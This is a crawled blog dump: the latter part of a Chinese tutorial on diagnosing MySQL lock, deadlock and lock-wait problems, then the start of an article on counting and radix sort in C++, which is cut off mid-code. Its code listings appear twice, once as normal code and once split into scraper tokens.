tables;,\n,session1:,\n,\n,session2：,\n,\n,可以看到会话1启用表锁（读锁）执行读操作，这时会话2可以并行执行读操作，但写操作被阻塞。接着看：,\n,session1:,\n,\n,session2:,\n,\n,当session1执行解锁后，seesion2则立刻开始执行写操作，即读-写串行。,\n,总结：,\n,到此我们把问题的原因基本分析清楚，总结一下——MyISAM存储引擎执行操作时会产生表锁，将影响其他用户对该表的操作，如果表锁是写锁，则会导致其他用户操作串行，如果是读锁则其他用户的读操作可以并行。所以有时我们遇到某个简单的查询花了很长时间，看看是不是这种情况。,\n,解决办法：,\n,1）、尽量不用MyISAM存储引擎，在MySQL8.0版本中已经去掉了所有的MyISAM存储引擎的表，推荐使用InnoDB存储引擎。,\n,2）、如果一定要用MyISAM存储引擎，减少写操作的时间；,\n,3、线上修改表结构有哪些风险？,\n,如果有一天业务系统需要增大一个字段长度，能否在线上直接修改呢？在回答这个问题前，我们先来看一个案例：,\n,\n,以上语句尝试修改user表的name字段长度，语句被阻塞。按照惯例，我们检查一下当前进程：,\n,\n,从进程可以看出alter语句在等待一个元数据锁，而这个元数据锁很可能是上面这条select语句引起的，事实正是如此。在执行DML（select、update、delete、insert）操作时，会对表增加一个元数据锁，这个元数据锁是为了保证在查询期间表结构不会被修改，因此上面的alter语句会被阻塞。那么如果执行顺序相反，先执行alter语句，再执行DML语句呢？DML语句会被阻塞吗？例如我正在线上环境修改表结构，线上的DML语句会被阻塞吗？答案是：不确定。,\n,在MySQL5.6开始提供了online ddl功能，允许一些DDL语句和DML语句并发，在当前5.7版本对online ddl又有了增强，这使得大部分DDL操作可以在线进行。详见：,https://dev.mysql.com/doc/refman/5.7/en/innodb-create-index-overview.html,\n,所以对于特定场景执行DDL过程中，DML是否会被阻塞需要视场景而定。,\n,总结：通过这个例子我们对元数据锁和online ddl有了一个基本的认识，如果我们在业务开发过程中有在线修改表结构的需求，可以参考以下方案：,\n,1、尽量在业务量小的时间段进行；,\n,2、查看官方文档，确认要做的表修改可以和DML并发，不会阻塞线上业务；,\n,3、推荐使用percona公司的pt-online-schema-change工具，该工具被官方的online ddl更为强大，它的基本原理是：通过insert… select…语句进行一次全量拷贝，通过触发器记录表结构变更过程中产生的增量，从而达到表结构变更的目的。,\n,例如要对A表进行变更，主要步骤为：,\n,创建目的表结构的空表，A_new;,\n,在A表上创建触发器，包括增、删、改触发器;,\n,通过insert…select…limit N 语句分片拷贝数据到目的表,\n,Copy完成后，将A_new表rename到A表。,\n,4、一个死锁问题的分析,\n,在线上环境下死锁的问题偶有发生，死锁是因为两个或多个事务相互等待对方释放锁，导致事务永远无法终止的情况。为了分析问题，我们下面将模拟一个简单死锁的情况，然后从中总结出一些分析思路。,\n,演示环境：MySQL5.7.20 事务隔离级别：RR,\n,表user：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nCREATE TABLE `USER` (\r\n`ID` INT(11) NOT NULL AUTO_INCREMENT,\r\n`NAME` VARCHAR(300) DEFAULT NULL,\r\n`AGE` INT(11) DEFAULT NULL,\r\nPRIMARY KEY (`ID`)\r\n) ENGINE=INNODB AUTO_INCREMENT=5 DEFAULT CHARSET=UTF8,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,CREATE ,TABLE, ,`,USER,`, ,(,`,ID,`, ,INT,(,11,), ,NOT, ,NULL, ,AUTO_INCREMENT,,,`,NAME,`, ,VARCHAR,(,300,), ,DEFAULT, ,NULL,,,`,AGE,`, ,INT,(,11,), ,DEFAULT, ,NULL,,,PRIMARY ,KEY, ,(,`,ID,`,),), ,ENGINE,=,INNODB ,AUTO_INCREMENT,=,5, ,DEFAULT, ,CHARSET,=,UTF8,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,\n,下面演示事务1、事务2工作的情况：,\n,\n,\n,\n,\n,\n,\n,\n,\n,\n,\n,\n,事务1,\n,\n,\n,事务2,\n,\n,\n,事务监控,\n,\n,\n,\n,\n,\n,T1,\n,begin;\n,Query OK, 0 rows affected (0.00 sec),\n,begin;\n,Query OK, 0 rows affected (0.00 sec),\n,\n,\n,\n,T2,\n,select * from user where id=3 for update;\n,+—-+——+——+,\n| id | name | age |,\n+—-+——+——+,\n| 3 | sun | 20 |,\n+—-+——+——+,\n1 row in set (0.00 sec),\n,select * from user where id=4 for update;\n,+—-+——+——+,\n| id | name | age |,\n+—-+——+——+,\n| 4 | zhou | 21 |,\n+—-+——+——+,\n1 row in set (0.00 sec),\n,select * from information_schema.INNODB_TRX；\n,通过查询元数据库innodb事务表，监控到当前运行事务数为2，即事务1、事务2。,\n,\n,\n,T3,\n,update user set name=’haha’ where id=4;\n,因为id=4的记录已被事务2加上行锁，该语句将阻塞,\n,\n,监控到当前运行事务数为2。,\n,\n,\n,T4,\n,阻塞状态,\n,update user set name=’hehe’ where id=3;\n,ERROR 1213 (40001): Deadlock found when trying to get lock; try restarting transaction,\n,id=3的记录已被事务1加上行锁，而本事务持有id=4的记录行锁，此时InnoDB存储引擎检查出死锁，本事务被回滚。,\n,事务2被回滚，事务1仍在运行中，监控当前运行事务数为1。,\n,\n,\n,T5,\n,Query OK, 1 row affected (20.91 sec),\nRows matched: 1 Changed: 1 Warnings: 0由于事务2被回滚，原来阻塞的update语句被继续执行。,\n,\n,监控当前运行事务数为1。,\n,\n,\n,T6,\n,commit；\n,Query OK, 0 rows affected (0.00 sec),\n,\n,事务1已提交、事务2已回滚，监控当前运行事务数为0。,\n,\n,\n,\n,\n,这是一个简单的死锁场景，事务1、事务2彼此等待对方释放锁，InnoDB存储引擎检测到死锁发生，让事务2回滚，这使得事务1不再等待事务B的锁，从而能够继续执行。那么InnoDB存储引擎是如何检测到死锁的呢？为了弄明白这个问题，我们先检查此时InnoDB的状态：,\n,show engine innodb statusG,\n,————————,\n,LATEST DETECTED DEADLOCK,\n————————,\n2018-01-14 12:17:13 0x70000f1cc000,\n*** (1) TRANSACTION:,\nTRANSACTION 5120, ACTIVE 17 sec starting index read,\nmysql tables in use 1, locked 1,\nLOCK WAIT 3 lock struct(s), heap size 1136, 2 row lock(s),\nMySQL thread id 10, OS thread handle 123145556967424, query id 2764 localhost root updating,\nupdate user set name=’haha’ where id=4,\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:,\nRECORD LOCKS space id 94 page no 3 n bits 80 index PRIMARY of table ,test,.,user, trx id 5120 lock_mode X locks rec but not gap waiting,\nRecord lock, heap no 5 PHYSICAL RECORD: n_fields 5; compact format; info bits 0,\n0: len 4; hex 80000004; asc ;;,\n1: len 6; hex 0000000013fa; asc ;;,\n2: len 7; hex 520000060129a6; asc R ) ;;,\n3: len 4; hex 68616861; asc haha;;,\n4: len 4; hex 80000015; asc ;;,\n,*** (2) TRANSACTION:,\nTRANSACTION 5121, ACTIVE 12 sec starting index read,\nmysql tables in use 1, locked 1,\n3 lock struct(s), heap size 1136, 2 row lock(s),\nMySQL thread id 11, OS thread handle 123145555853312, query id 2765 localhost root updating,\nupdate user set name=’hehe’ where id=3,\n*** (2) HOLDS THE LOCK(S):,\nRECORD LOCKS space id 94 page no 3 n bits 80 index PRIMARY of table ,test,.,user, trx id 5121 lock_mode X locks rec but not gap,\nRecord lock, heap no 5 PHYSICAL RECORD: n_fields 5; compact format; info bits 0,\n0: len 4; hex 80000004; asc ;;,\n1: len 6; hex 0000000013fa; asc ;;,\n2: len 7; hex 520000060129a6; asc R ) ;;,\n3: len 4; hex 68616861; asc haha;;,\n4: len 4; hex 80000015; asc ;;,\n,*** (2) WAITING FOR THIS LOCK TO BE GRANTED:,\nRECORD LOCKS space id 94 page no 3 n bits 80 index PRIMARY of table ,test,.,user, trx id 5121 lock_mode X locks rec but not gap waiting,\nRecord lock, heap no 7 PHYSICAL RECORD: n_fields 5; compact format; info bits 0,\n0: len 4; hex 80000003; asc ;;,\n1: len 6; hex 0000000013fe; asc ;;,\n2: len 7; hex 5500000156012f; asc U V /;;,\n3: len 4; hex 68656865; asc hehe;;,\n4: len 4; hex 80000014; asc ;;,\n,*** WE ROLL BACK TRANSACTION (2),\n,InnoDB状态有很多指标，这里我们截取死锁相关的信息，可以看出InnoDB可以输出最近出现的死锁信息，其实很多死锁监控工具也是基于此功能开发的。,\n,在死锁信息中，显示了两个事务等待锁的相关信息（蓝色代表事务1、绿色代表事务2），重点关注：WAITING FOR THIS LOCK TO BE GRANTED和HOLDS THE LOCK(S)。,\n,WAITING FOR THIS LOCK TO BE GRANTED表示当前事务正在等待的锁信息，从输出结果看出事务1正在等待heap no为5的行锁，事务2正在等待 heap no为7的行锁；,\n,HOLDS THE LOCK(S)：表示当前事务持有的锁信息，从输出结果看出事务2持有heap no为5行锁。,\n,从输出结果看出，最后InnoDB回滚了事务2。,\n,那么InnoDB是如何检查出死锁的呢？,\n,我们想到最简单方法是假如一个事务正在等待一个锁，如果等待时间超过了设定的阈值，那么该事务操作失败，这就避免了多个事务彼此长等待的情况。参数innodb_lock_wait_timeout正是用来设置这个锁等待时间的。,\n,如果按照这个方法，解决死锁是需要时间的（即等待超过innodb_lock_wait_timeout设定的阈值），这种方法稍显被动而且影响系统性能，InnoDB存储引擎提供一个更好的算法来解决死锁问题，wait-for graph算法。简单的说，当出现多个事务开始彼此等待时，启用wait-for graph算法，该算法判定为死锁后立即回滚其中一个事务，死锁被解除。该方法的好处是：检查更为主动，等待时间短。,\n,下面是wait-for graph算法的基本原理：,\n,为了便于理解，我们把死锁看做4辆车彼此阻塞的场景：,\n,\n,\n,\n,\n,4辆车看做4个事务，彼此等待对方的锁，造成死锁。wait-for graph算法原理是把事务作为节点，事务之间的锁等待关系，用有向边表示，例如事务A等待事务B的锁，就从节点A画一条有向边到节点B，这样如果A、B、C、D构成的有向图，形成了环，则判断为死锁。这就是wait-for graph算法的基本原理。,\n,总结：,\n,1、如果我们业务开发中出现死锁如何检查出？刚才已经介绍了通过监控InnoDB状态可以得出，你可以做一个小工具把死锁的记录收集起来，便于事后查看。,\n,2、如果出现死锁，业务系统应该如何应对？从上文我们可以看到当InnoDB检查出死锁后，对客户端报出一个Deadlock found when trying to get lock; try restarting transaction信息，并且回滚该事务，应用端需要针对该信息，做事务重启的工作，并保存现场日志事后做进一步分析，避免下次死锁的产生。,\n,5、锁等待问题的分析,\n,在业务开发中死锁的出现概率较小，但锁等待出现的概率较大，锁等待是因为一个事务长时间占用锁资源，而其他事务一直等待前个事务释放锁。,\n,\n,\n,\n,\n,\n,\n,\n,\n,\n,\n,\n,事务1,\n,\n,\n,事务2,\n,\n,\n,事务监控,\n,\n,\n,\n,\n,\n,T1,\n,begin;\n,Query OK, 0 rows affected (0.00 sec),\n,begin;\n,Query OK, 0 rows affected (0.00 sec),\n,\n,\n,\n,T2,\n,select * from user where id=3 for update;\n,+—-+——+——+,\n| id | name | age |,\n+—-+——+——+,\n| 3 | sun | 20 |,\n+—-+——+——+,\n1 row in set (0.00 sec),\n,其他查询操作,\n,select * from information_schema.INNODB_TRX；\n,通过查询元数据库innodb事务表，监控到当前运行事务数为2，即事务1、事务2。,\n,\n,\n,T3,\n, 其他查询操作,\n, update user set name=’hehe’ where id=3;\n,因为id=3的记录被事务1加上行锁，所以该语句将阻塞（即锁等待）,\n, 监控到当前运行事务数为2。,\n,\n,\n,T4,\n,其他查询操作,\n,ERROR 1205 (HY000): Lock wait timeout exceeded; try restarting transaction\n,锁等待时间超过阈值，操作失败。注意：此时事务2并没有回滚。,\n,监控到当前运行事务数为2。,\n,\n,\n,T5,\n,commit;,\n,\n,事务1已提交，事务2未提交，监控到当前运行事务数为1。,\n,\n,\n,\n,\n,从上述可知事务1长时间持有id=3的行锁，事务2产生锁等待，等待时间超过innodb_lock_wait_timeout后操作中断，但事务并没有回滚。如果我们业务开发中遇到锁等待，不仅会影响性能，还会给你的业务流程提出挑战，因为你的业务端需要对锁等待的情况做适应的逻辑处理，是重试操作还是回滚事务。,\n,在MySQL元数据表中有对事务、锁等待的信息进行收集，例如information_schema数据库下的INNODB_LOCKS、INNODB_TRX、INNODB_LOCK_WAITS，你可以通过这些表观察你的业务系统锁等待的情况。你也可以用一下语句方便的查询事务和锁等待的关联关系：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSELECT     R.TRX_ID WAITING_TRX_ID,\r\n           R.TRX_MYSQL_THREAD_ID WAITING_THREAD,\r\n           R.TRX_QUERY WATING_QUERY,\r\n           B.TRX_ID BLOCKING_TRX_ID,\r\n           B.TRX_MYSQL_THREAD_ID BLOCKING_THREAD,\r\n           B.TRX_QUERY BLOCKING_QUERY\r\nFROM     INFORMATION_SCHEMA.INNODB_LOCK_WAITS W\r\nINNER JOIN     INFORMATION_SCHEMA.INNODB_TRX B ON B.TRX_ID = W.BLOCKING_TRX_ID\r\nINNER JOIN     INFORMATION_SCHEMA.INNODB_TRX R ON R.TRX_ID = W.REQUESTING_TRX_ID;,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SELECT, , , , , ,R,.,TRX_ID ,WAITING_TRX_ID,,,           ,R,.,TRX_MYSQL_THREAD_ID ,WAITING_THREAD,,,           ,R,.,TRX_QUERY ,WATING_QUERY,,,           ,B,.,TRX_ID ,BLOCKING_TRX_ID,,,           ,B,.,TRX_MYSQL_THREAD_ID ,BLOCKING_THREAD,,,           ,B,.,TRX_QUERY ,BLOCKING_QUERY,FROM, , , , , ,INFORMATION_SCHEMA,.,INNODB_LOCK,_,WAITS, ,W,INNER ,JOIN, , , , , ,INFORMATION_SCHEMA,.,INNODB,_,TRX, ,B, ,ON, ,B,.,TRX_ID, ,=, ,W,.,BLOCKING_TRX_ID,INNER ,JOIN, , , , , ,INFORMATION_SCHEMA,.,INNODB,_,TRX, ,R, ,ON, ,R,.,TRX_ID, ,=, ,W,.,REQUESTING_TRX_ID,;,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,结果：,\n,waiting_trx_id: 5132,\nwaiting_thread: 11,\nwating_query: update user set name=’hehe’ where id=3,\nblocking_trx_id: 5133,\nblocking_thread: 10,\nblocking_query: NULL,\n,总结：,\n,1、请对你的业务系统做锁等待的监控，这有助于你了解当前数据库锁情况，以及为你优化业务程序提供帮助；,\n,2、业务系统中应该对锁等待超时的情况做合适的逻辑判断。,\n,6、小结,\n,本文通过几个简单的示例介绍了我们常用的几种MySQL并发问题，并尝试得出针对这些问题我们排查的思路。文中涉及事务、表锁、元数据锁、行锁，但引起并发问题的远远不止这些，例如还有事务隔离级别、GAP锁等。真实的并发问题可能多而复杂，但排查思路和方法却是可以复用，在本文中我们使用了show processlist;show engine innodb status;以及查询元数据表的方法来排查发现问题，如果问题涉及到了复制，还需要借助master/slave监控来协助。,\n,参考资料：,\n,姜承尧《InnoDB存储引擎》,\n,李宏哲 杨挺 《MySQL排查指南》,\n,何登成 ,http://hedengcheng.com,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 3 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113968/", "url_object_id": "00300456460ea6d4134a02e6861bd127", "front_image_path": "full/35011d6168be00e949624c665041dc724e3ad786.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/10/9184208f96827c412ab7d3570590ef76.jpg"], "title": "常用排序算法总结（2）", "create_time": "2018/05/13", "vote": "1", "bookmark": "5", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,SteveWang,   ,上一篇总结了常用的比较排序算法,，主要有,冒泡排序,，,选择排序,，,插入排序,，,归并排序,，,堆排序,，,快速排序,等。,\n,这篇文章中我们来探讨一下常用的非比较排序算法：,计数排序,，,基数排序,，,桶排序,。在一定条件下，它们的时间复杂度可以达到O(n)。,\n,这里我们用到的唯一数据结构就是数组，当然我们也可以利用链表来实现下述算法。,\n,计数排序(Counting Sort),\n,计数排序用到一个额外的计数数组C，根据数组C来将原数组A中的元素排到正确的位置。,\n,通俗地理解，例如有10个年龄不同的人，假如统计出有8个人的年龄不比小明大（即小于等于小明的年龄，这里也包括了小明），那么小明的年龄就排在第8位，通过这种思想可以确定每个人的位置，也就排好了序。当然，年龄一样时需要特殊处理（保证稳定性）：通过反向填充目标数组，填充完毕后将对应的数字统计递减，可以确保计数排序的稳定性。,\n,计数排序的步骤如下：,\n,\n,统计数组A中每个值A[i]出现的次数，存入C[A[i]],\n,从前向后，使数组C中的每个值等于其与前一项相加，这样数组C[A[i]]就变成了代表数组A中小于等于A[i]的元素个数,\n,反向填充目标数组B：将数组元素A[i]放在数组B的第C[A[i]]个位置（下标为C[A[i]] – 1），每放一个元素就将C[A[i]]递减,\n,\n,计数排序的实现代码如下：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#include<iostream>\r\nusing namespace std;\r\n\r\n// 分类 ------------ 内部非比较排序\r\n// 数据结构 --------- 数组\r\n// 最差时间复杂度 ---- O(n + k)\r\n// 最优时间复杂度 ---- O(n + k)\r\n// 平均时间复杂度 ---- O(n + k)\r\n// 所需辅助空间 ------ O(n + k)\r\n// 稳定性 ----------- 稳定\r\n\r\n\r\nconst int k = 100;   // 基数为100，排序[0,99]内的整数\r\nint C[k];            // 计数数组\r\n\r\nvoid CountingSort(int A[], int n)\r\n{\r\n    for (int i = 0; i < k; i++)   // 初始化，将数组C中的元素置0(此步骤可省略，整型数组元素默认值为0)\r\n    {\r\n        C[i] = 0;\r\n    }\r\n    for (int i = 0; i < n; i++)   // 使C[i]保存着等于i的元素个数\r\n    {\r\n        C[A[i]]++;\r\n    }\r\n    for (int i = 1; i < k; i++)   // 使C[i]保存着小于等于i的元素个数，排序后元素i就放在第C[i]个输出位置上\r\n    {\r\n        C[i] = C[i] + C[i - 1];\r\n    }\r\n    int *B = (int *)malloc((n) * sizeof(int));// 分配临时空间,长度为n，用来暂存中间数据\r\n    for (int i = n - 1; i >= 0; i--)    // 从后向前扫描保证计数排序的稳定性(重复元素相对次序不变)\r\n    {\r\n        B[--C[A[i]]] = A[i];      // 把每个元素A[i]放到它在输出数组B中的正确位置上\r\n                                  // 当再遇到重复元素时会被放在当前元素的前一个位置上保证计数排序的稳定性\r\n    }\r\n    for (int i = 0; i < n; i++)   // 把临时空间B中的数据拷贝回A\r\n    {\r\n        A[i] = B[i];\r\n    }\r\n    free(B);    // 释放临时空间 \r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 15, 22, 19, 46, 27, 73, 1, 19, 8 };  // 针对计数排序设计的输入，每一个元素都在[0,100]上且有重复元素\r\n    int n = sizeof(A) / sizeof(int);\r\n    CountingSort(A, n);\r\n    printf(\"计数排序结果：\");\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#include<iostream>,using ,namespace, ,std,;, ,// 分类 ------------ 内部非比较排序,// 数据结构 --------- 数组,// 最差时间复杂度 ---- O(n + k),// 最优时间复杂度 ---- O(n + k),// 平均时间复杂度 ---- O(n + k),// 所需辅助空间 ------ O(n + k),// 稳定性 ----------- 稳定, , ,const, ,int, ,k, ,=, ,100,;,   ,// 基数为100，排序[0,99]内的整数,int, ,C,[,k,],;,            ,// 计数数组, ,void, ,CountingSort,(,int, ,A,[,],,, ,int, ,n,),{,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,k,;, ,i,++,),   ,// 初始化，将数组C中的元素置0(此步骤可省略，整型数组元素默认值为0),    ,{,        ,C,[,i,], ,=, ,0,;,    ,},    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n,;, ,i,++,),   ,// 使C[i]保存着等于i的元素个数,    ,{,        ,C,[,A,[,i,],],++,;,    ,},    ,for, ,(,int, ,i, ,=, ,1,;, ,i, ,<, ,k,;, ,i,++,),   ,// 使C[i]保存着小于等于i的元素个数，排序后元素i就放在第C[i]个输出位置上,    ,{,        ,C,[,i,], ,=, ,C,[,i,], ,+, ,C,[,i, ,-, ,1,],;,    ,},    ,int, ,*,B, ,=, ,(,int, ,*,),malloc,(,(,n,), ,*, ,sizeof,(,int,),),;,// 分配临时空间,长度为n，用来暂存中间数据,    ,for, ,(,int, ,i, ,=, ,n, ,-, ,1,;, ,i, ,>=, ,0,;, ,i,--,),    ,// 从后向前扫描保证计数排序的稳定性(重复元素相对次序不变),    ,{,        ,B,[,--,C,[,A,[,i,],],], ,=, ,A,[,i,],;,      ,// 把每个元素A[i]放到它在输出数组B中的正确位置上,                                  ,// 当再遇到重复元素时会被放在当前元素的前一个位置上保证计数排序的稳定性,    ,},    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n,;, ,i,++,),   ,// 把临时空间B中的数据拷贝回A,    ,{,        ,A,[,i,], ,=, ,B,[,i,],;,    ,},    ,free,(,B,),;,    ,// 释放临时空间 ,}, ,int, ,main,(,),{,    ,int, ,A,[,], ,=, ,{, ,15,,, ,22,,, ,19,,, ,46,,, ,27,,, ,73,,, ,1,,, ,19,,, ,8, ,},;,  ,// 针对计数排序设计的输入，每一个元素都在[0,100]上且有重复元素,    ,int, ,n, ,=, ,sizeof,(,A,), ,/, ,sizeof,(,int,),;,    ,CountingSort,(,A,,, ,n,),;,    ,printf,(,\"计数排序结果：\",),;,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n,;, ,i,++,),    ,{,        ,printf,(,\"%d \",,, ,A,[,i,],),;,    ,},    ,printf,(,\"\\n\",),;,    ,return, ,0,;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n\n,\n,下图给出了对{ 4, 1, 3, 4, 3 }进行计数排序的简单演示过程,\n,\n,计数排序的时间复杂度和空间复杂度与数组A的数据范围（A中元素的最大值与最小值的差加上1）有关，因此,对于数据范围很大的数组，计数排序需要大量时间和内存。,\n,例如：对0到99之间的数字进行排序，计数排序是最好的算法，然而计数排序并不适合按字母顺序排序人名，,将计数排序用在基数排序算法中，能够更有效的排序数据范围很大的数组。,\n,　　,基数排序(Radix Sort),\n,基数排序的发明可以追溯到1887年赫尔曼·何乐礼在打孔卡片制表机上的贡献。它是这样实现的：将所有待比较正整数统一为同样的数位长度，数位较短的数前面补零。然后，从最低位开始进行基数为10的计数排序，一直到最高位计数排序完后，数列就变成一个有序序列（利用了计数排序的稳定性）。,\n,基数排序的实现代码如下：,\n,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#include<iostream>\r\nusing namespace std;\r\n\r\n// 分类 ------------- 内部非比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- O(n * dn)\r\n// 最优时间复杂度 ---- O(n * dn)\r\n// 平均时间复杂度 ---- O(n * dn)\r\n// 所需辅助空间 ------ O(n * dn)\r\n// 稳定性 ----------- 稳定\r\n\r\nconst int dn = 3;                // 待排序的元素为三位数及以下\r\nconst int k = 10;                // 基数为10，每一位的数字都是[0,9]内的整数\r\nint C[k];\r\n\r\nint GetDigit(int x, int d)          // 获得元素x的第d位数字\r\n{\r\n    int radix[] = { 1, 1, 10, 100 };// 最大为三位数，所以这里只要到百位就满足了\r\n    return (x / radix[d]) % 10;\r\n}\r\n\r\nvoid CountingSort(int A[], int n, int d)// 依据元素的第d位数字，对A数组进行计数排序\r\n{\r\n    for (int i = 0; i < k; i++)\r\n    {\r\n        C[i] = 0;\r\n    }\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        C[GetDigit(A[i], d)]++;\r\n    }\r\n    for (int i = 1; i < k; i++)\r\n    {\r\n        C[i] = C[i] + C[i - 1];\r\n    }\r\n    int *B = (int*)malloc(n * sizeof(int));\r\n    for (int i = n - 1; i >= 0; i--)\r\n    {\r\n        int dight = GetDigit(A[i], d);  // 元素A[i]当前位数字为dight   \r\n        B[--C[dight]] = A[i];           // 根据当前位数字，把每个元素A[i]放到它在输出数组B中的正确位置上\r\n        // 当再遇到当前位数字同为dight的元素时，会将其放在当前元素的前一个位置上保证计数排序的稳定性\r\n    }\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        A[i] = B[i];\r\n    }\r\n    free(B);\r\n}\r\n\r\nvoid LsdRadixSort(int A[], int n)     // 最低位优先基数排序\r\n{\r\n    for (int d = 1; d <= dn; d++)     // 从低位到高位\r\n        CountingSort(A, n, d);        // 依据第d位数字对A进行计数排序\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 20, 90, 64, 289, 998, 365, 852, 123, 789, 456 };// 针对基数排序设计的输入\r\n    int n = sizeof(A) / sizeof(int);\r\n    LsdRadixSort(A, n);\r\n    printf(\"基数排序结果：\");\r\n    for (int i = 0; i < n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#include<iostream>,using ,namespace, ,std,;, ,// 分类 ------------- 内部非比较排序,// 数据结构 ---------- 数组,// 最差时间复杂度 ---- O(n * dn),// 最优时间复杂度 ---- O(n * dn),// 平均时间复杂度 ---- O(n * dn),// 所需辅助空间 ------ O(n * dn),// 稳定性 ----------- 稳定, ,const, ,int, ,dn, ,=, ,3,;,                ,// 待排序的元素为三位数及以下,const, ,int, ,k, ,=, ,10,;,                ,// 基数为10，每一位的数字都是[0,9]内的整数,int, ,C,[,k,],;, ,int, ,GetDigit,(,int, ,x,,, ,int, ,d,),          ,// 获得元素x的第d位数字,{,    ,int, ,radix,[,], ,=, ,{, ,1,,, ,1,,, ,10,,, ,100, ,},;,// 最大为三位数，所以这里只要到百位就满足了,    ,return, ,(,x, ,/, ,radix,[,d,],), ,%, ,10,;,}, ,void, ,CountingSort,(,int, ,A,[,],,, ,int, ,n,,, ,int, ,d,),// 依据元素的第d位数字，对A数组进行计数排序,{,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,k,;, ,i,++,),    ,{,        ,C,[,i,], ,=, ,0,;,    ,},    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n,;, ,i,++,),    ,{,        ,C,[,GetDigit,(,A,[,i,],,, ,d,),],++,;,    ,},    ,for, ,(,int, ,i, ,=, ,1,;, ,i, ,<, ,k,;, ,i,++,),    ,{,        ,C,[,i,], ,=, ,C,[,i,], ,+, ,C,[,i, ,-, ,1,],;,    ,},    ,int, ,*,B, ,=, ,(,int,*,),malloc,(,n *, ,sizeof,(,int,),),;,    ,for, ,(,int, ,i, ,=, ,n, ,-, ,1,;, ,i, ,>=, ,0,;, ,i,--,),    ,{,        ,int, ,dight, ,=, ,GetDigit,(,A,[,i,],,, ,d,),;,  ,// 元素A[i]当前位数字为dight   ,        ,B,[,--,C,[,dight,],], ,=, ,A,[,i,],;,           ,// 根据当前位数字，把每个元素A[i]放到它在输出数组B中的正确位置上,        ,// 当再遇到当前位数字同为dight的元素时，会将其放在当前元素的前一个位置上保证计数排序的稳定性,    ,},    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n,;, ,i,++,),    ,{,        ,A,[,i,], ,=, ,B,[,i,],;,    ,},    ,free,(,B,),;,}, ,void, ,LsdRadixSort,(,int, ,A,[,],,, ,int, ,n,),     ,// 最低位优先基数排序,{,    ,for, ,(,int, ,d, ,=, ,1,;, ,d, ,<=, ,dn,;, ,d,++,),     ,// 从低位到高位,        ,CountingSort,(,A,,, ,n,,, ,d,),;,        ,// 依据第d位数字对A进行计数排序,}, ,int, ,main,(,),{,    ,int, ,A,[,], ,=, ,{, ,20,,, ,90,,, ,64,,, ,289,,, ,998,,, ,365,,, ,852,,, ,123,,, ,789,,, ,456, ,},;,// 针对基数排序设计的输入,    ,int, ,n, ,=, ,sizeof,(,A,), ,/, ,sizeof,(,int,),;,    ,LsdRadixSort,(,A,,, ,n,),;,    ,printf,(,\"基数排序结果：\",),;,    ,for, ,(,int, ,i, ,=, ,0,;, ,i, ,<, ,n,;, ,i,++,),    ,{,        ,printf,(,\"%d \",,, ,A,[,i,],),;,    ,},    ,printf,(,\"\\n\",),;,    ,return, 